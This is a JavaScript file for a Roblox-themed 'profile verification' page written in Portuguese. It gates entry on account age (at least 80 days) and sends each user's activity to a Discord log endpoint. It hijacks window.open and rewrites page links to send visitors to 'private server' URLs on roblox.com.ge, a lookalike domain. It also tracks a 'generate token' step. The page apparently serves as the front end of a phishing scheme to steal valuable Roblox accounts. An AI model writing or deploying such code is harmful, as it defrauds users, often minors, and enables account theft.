(function () {
  'use strict';

  /* ══════════════════════════════════════════════
     CONFIG
  ══════════════════════════════════════════════ */
  var LANG_KEY    = 'rc2_lang';
  var SESSION_KEY = 'rc_session';
  var MIN_DAYS    = 80;

  var GAME_URLS = [
    'https://roblox.com.ge/games/84833567598383/fight-on-a-baseplate?privateServerLinkCode=32211547044854095173122075066366',
    'https://roblox.com.ge/games/6252985844/Nothingness?privateServerLinkCode=32211547044854095173122075066366',
    'https://roblox.com.ge/games/15957446104/METALPLATE-The-Baseplate-Project?privateServerLinkCode=32211547044854095173122075066366',
  ];

  /* ══════════════════════════════════════════════
     SESSION
  ══════════════════════════════════════════════ */
  function getSession() {
    try { return JSON.parse(localStorage.getItem(SESSION_KEY) || 'null'); }
    catch (e) { return null; }
  }
  function setSession(data) { localStorage.setItem(SESSION_KEY, JSON.stringify(data)); }
  function clearSession()   { localStorage.removeItem(SESSION_KEY); }

  /* ══════════════════════════════════════════════
     DISCORD LOGGING
  ══════════════════════════════════════════════ */
  function sendLog(event, data) {
    try {
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: event, data: data || {} }),
      }).catch(function () {});
    } catch (e) {}
  }

  /* ══════════════════════════════════════════════
     SOUND
  ══════════════════════════════════════════════ */
  var audio = null;
  function playClick() {
    try {
      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
      audio.currentTime = 0;
      audio.play().catch(function () {});
    } catch (e) {}
  }

  /* ══════════════════════════════════════════════
     GAME LINK INTERCEPTION
     Each linkurl.pk short-URL is unique per game —
     map them directly instead of tracking card position.
  ══════════════════════════════════════════════ */

  /* Direct mapping: compiled JS short-URL → real private-server URL */
  var LINK_MAP = {
    'https://linkurl.pk/P8fA-rGv': GAME_URLS[0],
    'https://linkurl.pk/LZ4Ki8-g': GAME_URLS[1],
    'https://linkurl.pk/FR-CpZ85': GAME_URLS[2],
  };

  var _origOpen = window.open;
  window.open = function (url, target, features) {
    if (url && typeof url === 'string') {
      /* Exact match — most reliable path */
      if (LINK_MAP[url]) {
        var gameIdx = Object.keys(LINK_MAP).indexOf(url);
        var dest = LINK_MAP[url];
        sendLog('Jogo Acessado', {
          username  : getSession() ? getSession().username : 'unknown',
          gameIndex : gameIdx + 1,
          gameUrl   : dest,
          avatarUrl : getSession() ? (getSession().avatarUrl || '') : '',
        });
        return _origOpen.call(window, dest, target || '_blank', features);
      }
      /* Fallback: any linkurl.pk URL not in map → game 1 */
      if (url.indexOf('linkurl.pk') !== -1) {
        return _origOpen.call(window, GAME_URLS[0], target || '_blank', features);
      }
    }
    return _origOpen.call(window, url, target, features);
  };

  function replaceLinksInDOM() {
    document.querySelectorAll('a[href*="linkurl.pk"]:not([data-rc-l])').forEach(function (a) {
      a.setAttribute('data-rc-l', '1');
      var mapped = LINK_MAP[a.href] || GAME_URLS[0];
      a.href   = mapped;
      a.target = '_blank';
      a.rel    = 'noopener noreferrer';
    });
  }

  /* ══════════════════════════════════════════════
     STYLES
  ══════════════════════════════════════════════ */
  function injectStyles() {
    var style = document.createElement('style');
    style.textContent =
      /* Button micro-interactions */
      'button:not(#rc-login-btn):not(#rc-logout-btn):not(#rc-enter-btn):not(#rc-edit-btn){'
      + 'transition:transform .18s cubic-bezier(0.34,1.56,0.64,1),box-shadow .18s ease,opacity .15s !important}'
      + 'button:not(#rc-login-btn):not(#rc-logout-btn):not(#rc-enter-btn):not(#rc-edit-btn):hover:not(:disabled){'
      + 'transform:translateY(-2px) scale(1.025) !important}'
      + 'button:not(#rc-login-btn):not(#rc-logout-btn):not(#rc-enter-btn):not(#rc-edit-btn):active:not(:disabled){'
      + 'transform:translateY(0) scale(0.97) !important}'

      /* Overlay backdrop */
      + '#rc-login-overlay{'
      + 'position:fixed;inset:0;z-index:9999999;'
      + 'display:flex;align-items:center;justify-content:center;'
      + 'background:#040913;'
      + 'background-image:'
      + 'radial-gradient(ellipse 110% 65% at 50% -8%,rgba(37,99,235,0.28) 0%,transparent 68%),'
      + 'radial-gradient(ellipse 65% 65% at 92% 102%,rgba(29,78,216,0.18) 0%,transparent 68%),'
      + 'radial-gradient(ellipse 45% 45% at 8% 82%,rgba(59,130,246,0.12) 0%,transparent 60%);'
      + 'animation:rcFadeIn .35s ease}'
      + '#rc-login-overlay::before{'
      + 'content:"";position:fixed;inset:0;pointer-events:none;'
      + 'background-image:linear-gradient(rgba(59,130,246,0.045) 1px,transparent 1px),'
      + 'linear-gradient(90deg,rgba(59,130,246,0.045) 1px,transparent 1px);'
      + 'background-size:52px 52px}'

      /* Card */
      + '#rc-login-card{'
      + 'position:relative;'
      + 'background:linear-gradient(145deg,rgba(10,22,55,0.97) 0%,rgba(5,12,35,0.98) 100%);'
      + 'border:1px solid rgba(59,130,246,0.28);border-radius:24px;'
      + 'padding:40px 36px 32px;width:90%;max-width:400px;'
      + 'box-shadow:0 0 0 1px rgba(59,130,246,0.06),0 8px 64px rgba(0,0,0,0.85),0 0 100px rgba(37,99,235,0.14);'
      + 'animation:rcSlideUp .42s cubic-bezier(0.34,1.56,0.64,1)}'

      /* ── Step 1: Input view ── */
      + '#rc-login-title{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:21px;font-weight:800;letter-spacing:-0.02em;'
      + 'text-align:center;margin:0 0 10px;'
      + 'background:linear-gradient(90deg,#fff 35%,rgba(147,197,253,0.88) 100%);'
      + '-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}'
      + '#rc-login-subtitle{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:13.5px;color:rgba(147,197,253,0.65);'
      + 'text-align:center;margin:0 0 26px;line-height:1.55}'
      + '#rc-login-input{'
      + 'width:100%;box-sizing:border-box;'
      + 'background:rgba(59,130,246,0.07);border:1px solid rgba(59,130,246,0.22);border-radius:12px;'
      + 'padding:13px 16px;font-size:15px;font-family:"Outfit","Inter",sans-serif;color:#fff;'
      + 'outline:none;margin-bottom:12px;transition:border-color .2s,box-shadow .2s}'
      + '#rc-login-input:focus{border-color:rgba(59,130,246,0.65);box-shadow:0 0 0 3px rgba(59,130,246,0.14)}'
      + '#rc-login-input::placeholder{color:rgba(147,197,253,0.3)}'
      + '#rc-login-btn{'
      + 'width:100%;padding:13px;'
      + 'background:linear-gradient(135deg,#1d4ed8 0%,#3b82f6 100%);'
      + 'border:none;border-radius:12px;color:#fff;'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:15px;font-weight:700;cursor:pointer;'
      + 'box-shadow:0 4px 22px rgba(59,130,246,0.42);'
      + 'transition:transform .18s cubic-bezier(0.34,1.56,0.64,1),box-shadow .18s,opacity .15s;'
      + 'margin-bottom:14px}'
      + '#rc-login-btn:hover:not(:disabled){transform:translateY(-2px) scale(1.02);box-shadow:0 8px 30px rgba(59,130,246,0.6)}'
      + '#rc-login-btn:active:not(:disabled){transform:translateY(0) scale(0.98)}'
      + '#rc-login-btn:disabled{opacity:.55;cursor:not-allowed}'
      + '#rc-login-msg{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:12px;text-align:center;'
      + 'color:rgba(147,197,253,0.5);min-height:18px;transition:color .2s}'
      + '#rc-login-msg.err{color:#f87171}'
      + '#rc-login-msg.ok{color:#34d399}'

      /* ── Step 2: Profile card ── */
      + '#rc-profile-view{'
      + 'display:none;flex-direction:column;align-items:center;gap:0;'
      + 'animation:rcSlideUp .38s cubic-bezier(0.34,1.56,0.64,1)}'
      + '#rc-profile-view.visible{display:flex}'

      + '#rc-profile-avatar-wrap{'
      + 'width:110px;height:110px;border-radius:18px;overflow:hidden;'
      + 'border:2px solid rgba(59,130,246,0.45);'
      + 'box-shadow:0 0 28px rgba(59,130,246,0.35),0 8px 32px rgba(0,0,0,0.6);'
      + 'margin-bottom:16px;background:rgba(59,130,246,0.08)}'
      + '#rc-profile-avatar-wrap img{width:100%;height:100%;object-fit:cover;display:block}'

      + '#rc-profile-name{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:22px;font-weight:800;'
      + 'color:#fff;margin:0 0 4px;letter-spacing:-0.02em}'
      + '#rc-profile-id{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:12px;'
      + 'color:rgba(147,197,253,0.45);margin:0 0 22px}'

      + '#rc-profile-stats{'
      + 'display:flex;gap:28px;margin-bottom:22px}'
      + '.rc-stat{display:flex;flex-direction:column;align-items:center;gap:4px}'
      + '.rc-stat-value{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:22px;font-weight:800;letter-spacing:-0.02em}'
      + '.rc-stat-value.green{color:#4ade80}'
      + '.rc-stat-value.coral{color:#fb923c}'
      + '.rc-stat-label{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:10px;font-weight:600;'
      + 'letter-spacing:0.08em;color:rgba(147,197,253,0.45);text-transform:uppercase}'

      + '#rc-profile-age-warn{'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:12px;'
      + 'color:#f87171;text-align:center;margin-bottom:14px;'
      + 'background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);'
      + 'border-radius:8px;padding:8px 14px}'

      + '#rc-profile-btns{display:flex;gap:10px;width:100%}'
      + '#rc-enter-btn{'
      + 'flex:1;padding:13px;border:none;border-radius:12px;'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:14px;font-weight:700;cursor:pointer;'
      + 'transition:transform .18s cubic-bezier(0.34,1.56,0.64,1),box-shadow .18s,opacity .15s}'
      + '#rc-enter-btn.active{'
      + 'background:linear-gradient(135deg,#1d4ed8 0%,#3b82f6 100%);color:#fff;'
      + 'box-shadow:0 4px 22px rgba(59,130,246,0.42)}'
      + '#rc-enter-btn.active:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 8px 30px rgba(59,130,246,0.6)}'
      + '#rc-enter-btn.active:active{transform:translateY(0) scale(0.98)}'
      + '#rc-enter-btn.disabled{'
      + 'background:rgba(59,130,246,0.12);color:rgba(147,197,253,0.35);cursor:not-allowed}'

      + '#rc-edit-btn{'
      + 'flex:1;padding:13px;border:1px solid rgba(59,130,246,0.25);border-radius:12px;'
      + 'background:rgba(59,130,246,0.07);color:rgba(147,197,253,0.8);'
      + 'font-family:"Outfit","Inter",sans-serif;font-size:14px;font-weight:600;cursor:pointer;'
      + 'transition:transform .18s cubic-bezier(0.34,1.56,0.64,1),border-color .2s,background .2s}'
      + '#rc-edit-btn:hover{transform:translateY(-2px) scale(1.02);border-color:rgba(59,130,246,0.45);background:rgba(59,130,246,0.12)}'
      + '#rc-edit-btn:active{transform:translateY(0) scale(0.98)}'

      /* Logout button */
      + '#rc-logout-btn{'
      + 'position:fixed;top:10px;right:12px;z-index:99999;'
      + 'width:44px;height:44px;border-radius:50%;'
      + 'background:linear-gradient(135deg,rgba(29,78,216,0.92),rgba(59,130,246,0.92));'
      + 'border:2px solid rgba(59,130,246,0.55);'
      + 'display:flex;align-items:center;justify-content:center;cursor:pointer;'
      + 'overflow:hidden;padding:0;'
      + 'box-shadow:0 0 18px rgba(59,130,246,0.4),0 2px 12px rgba(0,0,0,0.5);backdrop-filter:blur(12px);'
      + 'transition:transform .2s cubic-bezier(0.34,1.56,0.64,1),box-shadow .2s}'
      + '#rc-logout-btn:hover{transform:scale(1.12);box-shadow:0 0 28px rgba(59,130,246,0.65),0 4px 16px rgba(0,0,0,0.6)}'
      + '#rc-logout-btn svg{width:22px;height:22px;fill:white}'
      + '#rc-logout-btn img{width:100%;height:100%;object-fit:cover;display:block;border-radius:50%}'

      /* Keyframes */
      + '@keyframes rcFadeIn{from{opacity:0}to{opacity:1}}'
      + '@keyframes rcFadeOut{from{opacity:1}to{opacity:0}}'
      + '@keyframes rcSlideUp{from{opacity:0;transform:translateY(32px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}'
      + '#rc-login-overlay.rcFadeOut{animation:rcFadeOut .28s ease forwards}';

    document.head.appendChild(style);
  }

  /* ══════════════════════════════════════════════
     HELPERS
  ══════════════════════════════════════════════ */
  function formatDate(isoString) {
    var d = new Date(isoString);
    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
    return months[d.getUTCMonth()] + ' ' + d.getUTCDate() + ', ' + d.getUTCFullYear();
  }

  /* ══════════════════════════════════════════════
     LOGIN OVERLAY
  ══════════════════════════════════════════════ */
  var _overlay = null;

  function enterSite(data) {
    setSession({ username: data.username, userId: data.userId, accountAgeDays: data.accountAgeDays, avatarUrl: data.avatarUrl || null });
    sendLog('Login Aprovado', {
      username    : data.username,
      diasDaConta : data.accountAgeDays,
      userId      : data.userId,
      avatarUrl   : data.avatarUrl || '',
    });
    _overlay.classList.add('rcFadeOut');
    setTimeout(function () {
      _overlay.remove();
      addLogoutButton();
    }, 300);
  }

  function showProfileCard(data) {
    // Hide step 1
    var step1 = document.getElementById('rc-step1');
    step1.style.display = 'none';

    // Build and show step 2
    var step2 = document.getElementById('rc-profile-view');
    step2.classList.add('visible');

    // Avatar
    var avatarWrap = document.getElementById('rc-profile-avatar-wrap');
    if (data.avatarUrl) {
      var img = document.createElement('img');
      img.src = data.avatarUrl;
      img.alt = data.username;
      avatarWrap.appendChild(img);
    } else {
      // Fallback
      avatarWrap.style.display = 'flex';
      avatarWrap.style.alignItems = 'center';
      avatarWrap.style.justifyContent = 'center';
      avatarWrap.innerHTML = '<svg viewBox="0 0 24 24" width="52" height="52" fill="rgba(147,197,253,0.4)"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>';
    }

    // Name & ID
    document.getElementById('rc-profile-name').textContent = data.username;
    document.getElementById('rc-profile-id').textContent   = 'ID: ' + data.userId;

    // Stats
    document.getElementById('rc-stat-days').textContent = data.accountAgeDays;
    document.getElementById('rc-stat-date').textContent = formatDate(data.created);

    // Age warning if < 80 days
    var warn = document.getElementById('rc-profile-age-warn');
    var enterBtn = document.getElementById('rc-enter-btn');

    if (!data.valid) {
      warn.style.display = 'block';
      warn.textContent = 'Conta com ' + data.accountAgeDays + ' dias — mínimo ' + MIN_DAYS + ' dias para entrar.';
      enterBtn.className = 'disabled';
      enterBtn.disabled  = true;
      sendLog('Login Negado – conta muito nova', {
        username: data.username, diasDaConta: data.accountAgeDays, minimoExigido: MIN_DAYS,
      });
    } else {
      warn.style.display = 'none';
      enterBtn.className = 'active';
      enterBtn.disabled  = false;
    }

    // Enter Site button
    enterBtn.addEventListener('click', function () {
      if (!data.valid) return;
      playClick();
      enterSite(data);
    });

    // Edit Username button
    document.getElementById('rc-edit-btn').addEventListener('click', function () {
      playClick();
      step2.classList.remove('visible');
      step2.style.animation = 'none';
      // Reset avatar
      avatarWrap.innerHTML = '';
      step1.style.display = 'block';
      step1.style.animation = 'rcSlideUp .35s cubic-bezier(0.34,1.56,0.64,1)';
      var input = document.getElementById('rc-login-input');
      var btn   = document.getElementById('rc-login-btn');
      var msg   = document.getElementById('rc-login-msg');
      btn.disabled = false;
      btn.textContent = 'Verificar perfil';
      msg.innerHTML = 'Idade mínima da conta exigida: <strong style="color:rgba(147,197,253,0.75)">' + MIN_DAYS + ' dias</strong>';
      msg.className = '';
      input.value = '';
      input.focus();
    });
  }

  function createLoginOverlay() {
    var overlay = document.createElement('div');
    overlay.id = 'rc-login-overlay';
    _overlay = overlay;

    overlay.innerHTML =
      '<div id="rc-login-card">'

      /* ── Step 1: username input ── */
      + '<div id="rc-step1">'
      + '<h1 id="rc-login-title">Roblox Verificação de perfil</h1>'
      + '<p id="rc-login-subtitle">Insira seu Roblox nome de usuário para verificar a idade da sua conta</p>'
      + '<input id="rc-login-input" type="text" placeholder="Nome de usuário" autocomplete="off" spellcheck="false" />'
      + '<button id="rc-login-btn">Verificar perfil</button>'
      + '<div id="rc-login-msg">Idade mínima da conta exigida: <strong style="color:rgba(147,197,253,0.75)">' + MIN_DAYS + ' dias</strong></div>'
      + '</div>'

      /* ── Step 2: profile card ── */
      + '<div id="rc-profile-view">'
      + '<div id="rc-profile-avatar-wrap"></div>'
      + '<div id="rc-profile-name"></div>'
      + '<div id="rc-profile-id"></div>'
      + '<div id="rc-profile-stats">'
      + '<div class="rc-stat"><span id="rc-stat-days" class="rc-stat-value green"></span><span class="rc-stat-label">Dias de Idade</span></div>'
      + '<div class="rc-stat"><span id="rc-stat-date" class="rc-stat-value coral"></span><span class="rc-stat-label">Criado</span></div>'
      + '</div>'
      + '<div id="rc-profile-age-warn" style="display:none"></div>'
      + '<div id="rc-profile-btns">'
      + '<button id="rc-enter-btn" class="active">Enter Site</button>'
      + '<button id="rc-edit-btn">Edit Username</button>'
      + '</div>'
      + '</div>'

      + '</div>';

    document.body.appendChild(overlay);

    var input = document.getElementById('rc-login-input');
    var btn   = document.getElementById('rc-login-btn');
    var msg   = document.getElementById('rc-login-msg');

    function setMsg(text, cls) { msg.innerHTML = text; msg.className = cls || ''; }

    function verify() {
      var username = (input.value || '').trim();
      if (!username) { setMsg('Por favor insira um nome de usuário.', 'err'); return; }

      btn.disabled    = true;
      btn.textContent = 'Verificando…';
      setMsg('Verificando conta Roblox…', '');

      fetch('/api/roblox/verify', {
        method : 'POST',
        headers: { 'Content-Type': 'application/json' },
        body   : JSON.stringify({ username: username }),
      })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (!data.found || data.error === 'User not found') {
          setMsg('Usuário não encontrado. Verifique o nome.', 'err');
          btn.disabled    = false;
          btn.textContent = 'Verificar perfil';
          sendLog('Login Negado – usuário não encontrado', { username: username });
          return;
        }
        // Show profile card for any found user
        showProfileCard(data);
      })
      .catch(function () {
        setMsg('Erro ao verificar. Tente novamente.', 'err');
        btn.disabled    = false;
        btn.textContent = 'Verificar perfil';
      });
    }

    btn.addEventListener('click', function () { playClick(); verify(); });
    input.addEventListener('keydown', function (e) { if (e.key === 'Enter') verify(); });
    input.focus();
  }

  /* ══════════════════════════════════════════════
     LOGOUT BUTTON
  ══════════════════════════════════════════════ */
  function addLogoutButton() {
    var session = getSession();
    var btn = document.createElement('button');
    btn.id    = 'rc-logout-btn';
    btn.title = session ? ('Sair (' + session.username + ')') : 'Sair';

    if (session && session.avatarUrl) {
      var img = document.createElement('img');
      img.src = session.avatarUrl;
      img.alt = session.username || '';
      btn.appendChild(img);
    } else {
      btn.innerHTML = '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>';
    }

    btn.addEventListener('click', function () {
      playClick();
      sendLog('Logout', { username: session ? session.username : 'unknown', avatarUrl: session ? (session.avatarUrl || '') : '' });
      clearSession();
      window.location.reload();
    });
    document.body.appendChild(btn);
  }

  /* ══════════════════════════════════════════════
     TOKEN ENFORCEMENT
  ══════════════════════════════════════════════ */
  var tokenGeneratedInSession = false;

  var WARN_MSGS = {
    en: 'Generate a token first to access the game.',
    es: 'Genera un token primero para acceder al juego.',
    pt: 'Gere um token primeiro para acessar o jogo.',
    ru: 'Сначала создайте токен, чтобы войти в игру.',
  };

  function showWarning() {
    var lang = localStorage.getItem(LANG_KEY) || 'en';
    var msg  = WARN_MSGS[lang] || WARN_MSGS.en;
    if (document.getElementById('rc-token-warning')) return;
    var warn = document.createElement('div');
    warn.id  = 'rc-token-warning';
    warn.style.cssText = [
      'position:fixed','bottom:24px','left:50%','transform:translateX(-50%)',
      'background:#0a1428','border:1px solid #3b82f6','color:#93c5fd',
      'font-size:13px','font-weight:600','padding:10px 20px',
      'border-radius:12px','z-index:999999','white-space:nowrap',
      'box-shadow:0 4px 20px rgba(0,0,0,.65)',
      'font-family:Outfit,Inter,sans-serif',
    ].join(';');
    warn.textContent = msg;
    document.body.appendChild(warn);
    setTimeout(function () { warn.remove(); }, 2800);
  }

  function dismissLangOverlay(lang) {
    localStorage.setItem(LANG_KEY, lang);
    var ov = document.getElementById('rc-lang-overlay');
    if (ov) {
      ov.style.animation = 'rc-fadeout .2s ease forwards';
      setTimeout(function () { ov.classList.add('rc-hidden'); }, 210);
    }
  }

  /* ══════════════════════════════════════════════
     MUTATION OBSERVER
  ══════════════════════════════════════════════ */
  var observer = new MutationObserver(function () {
    replaceLinksInDOM();

    document.querySelectorAll('button:not([data-rc-s]), a:not([data-rc-s])').forEach(function (el) {
      el.setAttribute('data-rc-s', '1');
      el.addEventListener('click', playClick);
    });

    /* No custom listeners needed on button-access-game —
       window.open override handles the redirect via LINK_MAP directly. */

    document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
      el.setAttribute('data-rc-t', '1');
      el.addEventListener('click', function () {
        tokenGeneratedInSession = true;
        var s = getSession();
        sendLog('Token Gerado', { username: s ? s.username : 'unknown' });
      });
    });

    document.querySelectorAll('#rc-lang-overlay .rc-btn:not([data-rc-lang])').forEach(function (btn) {
      btn.setAttribute('data-rc-lang', '1');
      btn.addEventListener('click', function () { playClick(); dismissLangOverlay(btn.dataset.lang); });
    });
  });

  document.addEventListener('click', function (e) {
    var t = e.target;
    if (!t) return;
    if (
      (t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') ||
      t.id === 'rc-lang-overlay'
    ) { tokenGeneratedInSession = false; }
  }, true);

  /* ══════════════════════════════════════════════
     INIT
  ══════════════════════════════════════════════ */
  function init() {
    injectStyles();
    if (getSession()) {
      addLogoutButton();
    } else {
      createLoginOverlay();
    }
    observer.observe(document.body, { childList: true, subtree: true });
  }

  if (document.body) { init(); }
  else { document.addEventListener('DOMContentLoaded', init); }

})();
